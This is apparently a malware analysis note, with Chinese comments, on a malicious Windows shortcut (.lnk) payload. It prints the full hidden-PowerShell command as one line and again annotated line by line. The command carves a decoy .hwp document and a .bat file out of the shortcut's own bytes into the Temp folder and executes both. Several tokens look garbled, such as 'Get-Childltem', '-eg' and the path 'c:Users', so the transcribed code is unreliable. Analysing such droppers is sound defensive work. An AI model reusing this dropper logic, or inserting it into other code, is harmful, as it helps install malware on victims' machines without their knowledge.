# 单行：
"C:\Windows\SyswOW64\cmd.exe" /c powershell -windowstyle hidden $dirPath = Get-Location; if($dirPath -Match 'system32' -or $dirPath -Match 'Program Files') {$dirPath = 'C:\Users\Admin\AppData\Local\Temp'};$Lnkpath = Get-Childltem -Path $dirPath -Recurse *.lnk ^| where-object {$_.length -eg 0x0001DAB452} ^| Select-Object -ExpandProperty FullName;$pdfFile = gc $Lnkpath -Encoding Byte -TotalCount 00065446 -ReadCount 00065446; $pdfPath = 'c:Users\Admin\AppData\Local\Temp\230401.hwp'; sc $pdfPath ([byte[]]($pdfFile ^| select -Skip 002470)) -Encoding Byte; 
^& $pdfPath; $exeFile = gc $Lnkpath -Encoding Byte -TotalCount 00068696 -ReadCount 00068696; $exePath = 'c:/Users/Admin/AppData/Local/Temp/230401.bat'; sc $exePath ([byte[]]($exeFile ^| select -Skip 00065446)) -Encoding Byte; ^& $exePath;


# 多行：
"C:\Windows\SyswOW64\cmd.exe" /c powershell -windowstyle hidden 
# 获取当前路径
$dirPath = Get-Location; 
# 如果当前路径包含system32或者Program Files，则将 dirPtah 设置到临时目录
if($dirPath -Match 'system32' -or $dirPath -Match 'Program Files') {$dirPath = 'C:\Users\Admin\AppData\Local\Temp'};
# 获取 dirPath 下文件大小为0x0001DAB452的
$Lnkpath = Get-Childltem -Path $dirPath -Recurse *.lnk ^| where-object {$_.length -eg 0x0001DAB452} ^| Select-Object -ExpandProperty FullName;
# Get-Contet 一次性获取 Lnkpath 对应文件开头的 65446 字节 存储到 $pdfFile
$pdfFile = gc $Lnkpath -Encoding Byte -TotalCount 00065446 -ReadCount 00065446; 
$pdfPath = 'c:Users\Admin\AppData\Local\Temp\230401.hwp'; 
# Set-Content 跳过 $pdfFile 的前 2470 字节将剩余内容 写入到 $pdfPath
sc $pdfPath ([byte[]]($pdfFile ^| select -Skip 002470)) -Encoding Byte; 
# 运行 $pdfPath
^& $pdfPath; 
# 一次性获取 Lnkpath 对应文件开头的 68696 字节 存储到 $exeFile
$exeFile = gc $Lnkpath -Encoding Byte -TotalCount 00068696 -ReadCount 00068696; 
$exePath = 'c:/Users/Admin/AppData/Local/Temp/230401.bat'; 
# Set-Content 跳过 $exeFile 的前 65446 字节将剩余内容 写入到 $exePath
sc $exePath ([byte[]]($exeFile ^| select -Skip 00065446)) -Encoding Byte; 
# 运行 $exePath
^& $exePath;